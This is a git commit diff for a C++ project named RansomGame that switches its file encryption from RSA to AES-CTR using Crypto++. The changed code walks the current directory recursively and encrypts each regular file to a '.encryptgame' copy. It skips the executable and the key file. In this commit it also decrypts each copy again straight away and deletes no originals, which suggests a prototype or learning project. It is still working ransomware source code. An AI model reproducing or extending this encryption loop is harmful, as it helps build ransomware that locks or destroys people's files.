897b80d36323a1bf961d5b3c32d1a64ff161d165
William  Adam-Grenier <william.a-g@hotmail.com>
2020-03-23 20:22:17 -0400

    Changed From RSA to AES

--- RansomGame/Ransom.cpp
+++ RansomGame/Ransom.cpp
@@ -8,27 +8,25 @@ void Ransom::run_encryption_logic()
 	 * 3- Encrypt files
 	 */
 
-	 //this->generate_rsa_private_key();
-
+	this->generate_aes_key();
 	const auto path = std::filesystem::current_path();
 
-	for (const auto& entry : std::filesystem::directory_iterator(path))
+	for (const auto& entry : std::filesystem::recursive_directory_iterator(path))
 	{
-
 		if (entry.path().filename() == "RansomGame.exe" || entry.path().filename() == encryption_file_ || entry.path().filename().extension() == custom_extension_name)
 		{
 			// Do not encrypt the key file, the executable itself, or an already encrypted file
 		}
-		else
+		else if (entry.is_regular_file())
 		{
-			std::cout << "Encrypting file: " << entry.path().filename() << std::endl;
-			const auto& entry_path = entry.path();
-			this->encrypt_files((char*) entry_path.c_str());
+			auto entry_name = absolute(entry).generic_string();
+			
+			std::cout << "Encrypting file " << entry_name << std::endl;
+			std::string aa = entry_name + custom_extension_name;
+			encrypt_files(const_cast<char*>(entry_name.c_str()));
+			decrypt_files(const_cast<char*>(aa.c_str()));
 		}
-
 	}
-	
-	//this->decrypt_files("my_text.txt.encryptgame");
 }
 
 void Ransom::run_decryption_logic()
@@ -36,21 +34,60 @@ void Ransom::run_decryption_logic()
 	// if isEncrypted, find all files with the proper custom extension
 }
 
+inline bool EndOfFile(const CryptoPP::FileSource& file)
+{
+	std::istream* stream = const_cast<CryptoPP::FileSource&>(file).GetStream();
+	return stream->eof();
+}
+
 void Ransom::encrypt_files(const char* file_name)
 {
-	CryptoPP::RSAES_OAEP_SHA_Encryptor e(this->rsaes_oaep_sha_decryptor_->GetPublicKey());
+	auto size = std::filesystem::file_size(file_name);
 	std::string file_name_string = file_name;
-	
-	const auto full_dest = const_cast<char*>(file_name_string.append(custom_extension_name).c_str());
-	const auto encrypted_file_dest = new CryptoPP::FileSink(full_dest);
-	CryptoPP::FileSource(file_name, true, new CryptoPP::PK_EncryptorFilter(rng_, e, encrypted_file_dest));
+	const auto out = const_cast<char*>(file_name_string.append(custom_extension_name).c_str());
+
+	try
+	{
+		CryptoPP::CTR_Mode<CryptoPP::AES>::Encryption encryptor;
+		encryptor.SetKeyWithIV(key_->BytePtr(), key_->size(), iv_->BytePtr());
+		
+		
+		CryptoPP::MeterFilter meter;
+		CryptoPP::StreamTransformationFilter filter(encryptor);
+
+		CryptoPP::FileSource source(file_name, false);
+		CryptoPP::FileSink sink(out);
+
+		source.Attach(new CryptoPP::Redirector(filter));
+		filter.Attach(new CryptoPP::Redirector(meter));
+		meter.Attach(new CryptoPP::Redirector(sink));
+
+		const CryptoPP::word64 BLOCK_SIZE = 4096;
+		CryptoPP::word64 processed = 0;
+
+		while (!EndOfFile(source) && !source.SourceExhausted())
+		{
+			source.Pump(BLOCK_SIZE);
+			filter.Flush(false);
+
+			processed += BLOCK_SIZE;
+
+			if (processed % (1024 * 1024 * 10) == 0)
+				std::cout << "Processed: " << meter.GetTotalBytes() << std::endl;
+		}
+
+		// Signal there is no more data to process.
+		// The dtor's will do this automatically.
+		filter.MessageEnd();
+	}
+	catch (const CryptoPP::Exception & ex)
+	{
+		std::cerr << ex.what() << std::endl;
+	}
 }
 
 void Ransom::decrypt_files(const char* file_name)
 {
-	CryptoPP::RSAES_OAEP_SHA_Decryptor d(this->rsaes_oaep_sha_decryptor_->GetPrivateKey());
-	
-
 	std::string file_name_string = file_name;
 	const auto last_index = file_name_string.find_last_of(".");
 	
@@ -60,30 +97,58 @@ void Ransom::decrypt_files(const char* file_name)
 	
 	file_name_string = file_name_string.substr(0, last_index);
 	const auto full_name = const_cast<char*>(file_name_string.c_str());
+
+	try
+	{
+		CryptoPP::CTR_Mode<CryptoPP::AES>::Decryption decryptor;
+		decryptor.SetKeyWithIV(key_->BytePtr(), key_->size(), iv_->BytePtr());
+
+		CryptoPP::MeterFilter meter;
+		CryptoPP::StreamTransformationFilter filter(decryptor);
+
+		CryptoPP::FileSource source(file_name, false);
+		CryptoPP::FileSink sink(full_name);
+
+		source.Attach(new CryptoPP::Redirector(filter));
+		filter.Attach(new CryptoPP::Redirector(meter));
+		meter.Attach(new CryptoPP::Redirector(sink));
+
+		const CryptoPP::word64 BLOCK_SIZE = 4096;
+		CryptoPP::word64 processed = 0;
+
+		while (!EndOfFile(source) && !source.SourceExhausted())
+		{
+			source.Pump(BLOCK_SIZE);
+			filter.Flush(false);
+
+			processed += BLOCK_SIZE;
+
+			if (processed % (1024 * 1024 * 10) == 0)
+				std::cout << "Processed: " << meter.GetTotalBytes() << std::endl;
+		}
+
+		// Signal there is no more data to process.
+		// The dtor's will do this automatically.
+		filter.MessageEnd();
+	}
+	catch (const CryptoPP::Exception & ex)
+	{
+		std::cerr << ex.what() << std::endl;
+	}
 	
-	const auto decrypted_file_dest = new CryptoPP::FileSink(full_name);
-	CryptoPP::FileSource(file_name, true, new CryptoPP::PK_DecryptorFilter(rng_, d, decrypted_file_dest));
+	//const auto decrypted_file_dest = new CryptoPP::FileSink(full_name);
+	//CryptoPP::FileSource(file_name, true, new CryptoPP::PK_DecryptorFilter(rng_, d, decrypted_file_dest));
 }
 
-void Ransom::generate_rsa_private_key()
+void Ransom::generate_aes_key()
 {
-	// Checks if an encryption file already exists, if so, it loads it
-	if(std::filesystem::exists(encryption_file_))
-	{
-		CryptoPP::FileSource rdr(encryption_file_, true);
-		this->rsaes_oaep_sha_decryptor_ = new CryptoPP::RSAES_OAEP_SHA_Decryptor(rdr);
-	} else
-	{
-		// Otherwise it creates a new one
-		this->rsaes_oaep_sha_decryptor_ = new CryptoPP::RSAES_OAEP_SHA_Decryptor(rng_, 4096);
-		CryptoPP::TransparentFilter private_file(new CryptoPP::FileSink(encryption_file_));
-		this->rsaes_oaep_sha_decryptor_->GetPrivateKey().Save(private_file);
-	}
+	// Generate a random key
+	key_= new CryptoPP::SecByteBlock(0x00, CryptoPP::AES::DEFAULT_KEYLENGTH);
+	rng_.GenerateBlock(key_->BytePtr(), key_->size());
 
-	std::cout << "Prime key 1: " << this->rsaes_oaep_sha_decryptor_->GetKey().GetPrime1() << std::endl;
-	std::cout << "\nPrime key 2: " << this->rsaes_oaep_sha_decryptor_->GetKey().GetPrime2() << std::endl;
-	std::cout << "\nPrivate exp: " << this->rsaes_oaep_sha_decryptor_->GetKey().GetPrivateExponent() << std::endl;
-	std::cout << "\nModulus: " << this->rsaes_oaep_sha_decryptor_->GetKey().GetModulus() << std::endl;
+	// Generate a random IV
+	iv_ = new CryptoPP::SecByteBlock(CryptoPP::AES::BLOCKSIZE);
+	rng_.GenerateBlock(iv_->BytePtr(), iv_->size());
 }
 
 void Ransom::delete_file(const char* file)
--- RansomGame/Ransom.h
+++ RansomGame/Ransom.h
@@ -5,6 +5,7 @@
 #include <osrng.h>
 #include <filesystem>
 #include <rsa.h>
+#include "../cryptopp/modes.h"
 
 class Ransom
 {
@@ -15,13 +16,15 @@ public:
 	void run_decryption_logic();
 
 private:
+	int max_buffer_size = 450;
 	const char* encryption_file_ = "rsakey.der";
 	const char* custom_extension_name = ".encryptgame";
 	CryptoPP::AutoSeededRandomPool rng_;
-	CryptoPP::RSAES_OAEP_SHA_Decryptor* rsaes_oaep_sha_decryptor_;
+	CryptoPP::SecByteBlock* key_;
+	CryptoPP::SecByteBlock* iv_;
 	void encrypt_files(const char* file_name);
 	void decrypt_files(const char* file_name);
-	void generate_rsa_private_key();
+	void generate_aes_key();
 	static void delete_file(const char* file);
 	
 };
